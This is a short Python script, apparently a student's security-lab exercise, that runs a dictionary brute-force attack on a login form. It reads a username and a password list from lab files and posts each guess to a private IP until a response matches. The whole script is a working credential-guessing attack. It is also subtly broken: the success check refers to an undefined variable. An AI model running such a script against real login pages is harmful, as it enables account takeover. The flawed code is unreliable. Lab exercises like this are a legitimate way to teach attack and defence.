import requests

with open('/home/cse/Lab4/Q1', 'r') as file:
    username = file.read()

with open('/home/cse/Lab4/Q2.dictionary.txt', 'r') as file:
    pwds = [line.strip() for line in file]

for pwd in pwds:
    print(f'Trying password: {pwd}')
    payload = {
        'username': username,
        'password': pwd,
        'submit': 'submit'
    }
    response = requests.post('http://10.13.4.80', payload)
    print(response)

    if success in str(response.content):
        print(f'Password found: {pwd}')
        break
    else:
        print('Password not found')

